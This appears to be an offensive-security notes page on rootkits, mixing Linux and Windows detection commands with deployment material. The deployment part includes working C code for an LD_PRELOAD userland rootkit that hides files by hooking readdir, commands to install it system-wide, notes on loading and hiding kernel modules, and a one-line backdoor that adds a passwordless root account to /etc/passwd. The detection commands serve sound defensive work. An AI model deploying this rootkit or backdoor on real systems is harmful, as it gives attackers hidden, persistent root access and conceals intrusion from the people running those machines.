# Rootkits — Detection, Deployment & Evasion

**Tags:** #rootkit #persistence #evasion #post-exploitation

---

## Linux Rootkit Detection

```bash
# rkhunter
rkhunter --check --sk
rkhunter --update && rkhunter --check

# chkrootkit
chkrootkit
chkrootkit -r /mnt/suspect  # Check mounted disk

# Manual checks
ls -la /proc/*/exe 2>/dev/null | grep deleted  # Deleted binaries still running
find / -name "*.ko" -newer /boot/vmlinuz 2>/dev/null  # New kernel modules
lsmod | grep -v "$(cat /proc/modules | awk '{print $1}')"  # Hidden modules
cat /proc/modules | awk '{print $1}' | sort > live.txt && lsmod | awk '{print $1}' | sort > lsmod.txt && diff live.txt lsmod.txt

# Check for hidden processes
ps aux | awk '{print $2}' | sort -n > ps.txt && ls /proc | grep '^[0-9]' | sort -n > proc.txt && diff ps.txt proc.txt

# Check LD_PRELOAD hijacks
cat /etc/ld.so.preload
find / -name "ld.so.preload" 2>/dev/null

# Check /etc/passwd for new root users
awk -F: '$3==0{print $1}' /etc/passwd

# Tripwire / AIDE baseline check
aide --check
```

## Windows Rootkit Detection

```bash
# Sysinternals rootkit tools
.\RootkitRevealer.exe
.\Process Explorer.exe   # Compare against Process Hacker for hidden processes

# GMER — scan for hooks/hidden objects
.\gmer.exe /iam

# Hidden processes
tasklist /v
wmic process list brief
# Compare outputs — discrepancies = rootkit

# Check hidden registry keys
.\autoruns.exe -a *  # Autorun entries
reg query HKLM\SYSTEM\CurrentControlSet\Services  # Hidden services

# Kernel integrity (Windows 8+)
# PatchGuard protects kernel — user-mode rootkits more common
```

## LD_PRELOAD Rootkit (Linux — Userland)

```bash
# Create shared library that intercepts functions
cat > evil.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

#define HIDE_PREFIX "evil_"

struct dirent *readdir(DIR *dirp) {
    struct dirent *(*orig_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep;
    while((ep = orig_readdir(dirp)) != NULL)
        if(!strstr(ep->d_name, HIDE_PREFIX)) return ep;
    return NULL;
}
CEOF
gcc -shared -fPIC -o evil.so evil.c -ldl

# Install globally (requires root)
echo "/path/to/evil.so" > /etc/ld.so.preload
# or per-session:
export LD_PRELOAD=/path/to/evil.so

# Cleanup rootkit
# https://github.com/bluedragonsecurity/bds_userland
```

## Kernel Module Rootkit (Linux)

```bash
# Load custom kernel module
insmod rootkit.ko
modprobe rootkit

# Hide module after loading
rmmod --force rootkit  # Can't unload if hidden

# Check if module hiding itself
lsmod | grep rootkit  # Won't appear if hiding
cat /proc/modules | grep rootkit  # May still appear in raw
```

## Persistence via Rootkit

```bash
# After install: hidden process, hidden file, hidden user
# Backdoor: SSH key + hidden user
echo "hax0r::0:0::/root:/bin/bash" >> /etc/passwd  # No password required
# Or: add to authorized_keys of hidden .ssh dir
```

## Related Notes

- [[08-Persistence/Linux-Persistence]] — Persistence without rootkits
- [[09-Covering-Tracks/Artifact-Cleanup]] — Remove traces
